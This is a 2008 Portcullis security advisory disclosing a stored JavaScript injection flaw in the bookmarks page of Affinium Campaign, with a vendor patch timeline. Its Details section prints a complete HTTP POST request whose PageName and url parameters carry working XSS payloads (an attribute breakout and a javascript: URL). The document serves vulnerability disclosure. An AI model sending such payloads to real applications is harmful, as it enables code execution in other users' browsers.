Portcullis Security Advisory - 08-001


Vulnerable System:

Affinium Campaign


Vulnerability Title:

The web application's bookmarks web page is vulnerable to a JavaScript injection.


Vulnerability Discovery And Development:

Portcullis Security Testing Services.


Credit For Discovery:

Tim Brown - Portcullis Computer-Security Ltd.


Affected systems:

All known versions of Affinium Campaign; the vulnerability discovered was for version 7.2.1.0.55.


Details:

It is possible for an attacker to inject JavaScript into the bookmarks web page by manipulating the PageName and url parameters of requests to https://webserver/Campaign/Campaign. For example:

POST /Campaign/Campaign HTTP/1.1
Host: webserver
Cookies: ADMINCONSOLESESSION=HJvLfMGn2KaCJDzcHvv0pbMCldhZNd8vd29g546JL028wcPF08ht!890790959; AMSSESSIONID=HJQKGLYD3jy0BaBckv1G2J1Jh0TJqC8fMp9abvmxG7Ryf0cCJ0Jg!890790959; CAMPAIGNSESSIONID=HJaAjn2Kv99LTaXQ2QZnhNT2nh5VQXSYpSmmf0l1KFLBFnFzVvv5!890790959
Content-Type: application/x-www-form-urlencoded
Content-length: 169

PageName=" onmouseover="javascript:alert('xss')" name="&url=javascript%3Aalert%28%27xss%27%29&function=CustomBookMarkLink&cmd=add&CustomBookmarkFrame=CustomBookmarkReply

The application will accept JavaScript: style URLs. In addition, by injecting into the title field, the input is sanitised on the main page, although it is executed when the bookmark is edited.


Impact:

An attacker would be able to use this to execute malicious code on a visitors computers.


Exploit:

Exploit code is not required.

Vendor Status:

05/06/2008 - vendor informed
10/06/2008 - Vendor updated
11/06/2008 - Vendor responded via email
16/07/2008 - Vendor confirmed patches


Copyright:

Copyright © Portcullis Computer Security Limited 2008, All rights reserved worldwide.
Permission is hereby granted for the electronic redistribution of this information. It is not to be edited or altered in any way without the express written consent of Portcullis Computer Security Limited.


Disclaimer:

The information herein contained may change without notice. Use of this information constitutes acceptance for use in an AS IS condition. There are NO warranties, implied or otherwise, with regard to this information or its use. Any use of this information is at the user's risk. In no event shall the author/distributor (Portcullis Computer Security Limited) be held liable for any damages whatsoever arising out of or in connection with the use or spread of this information.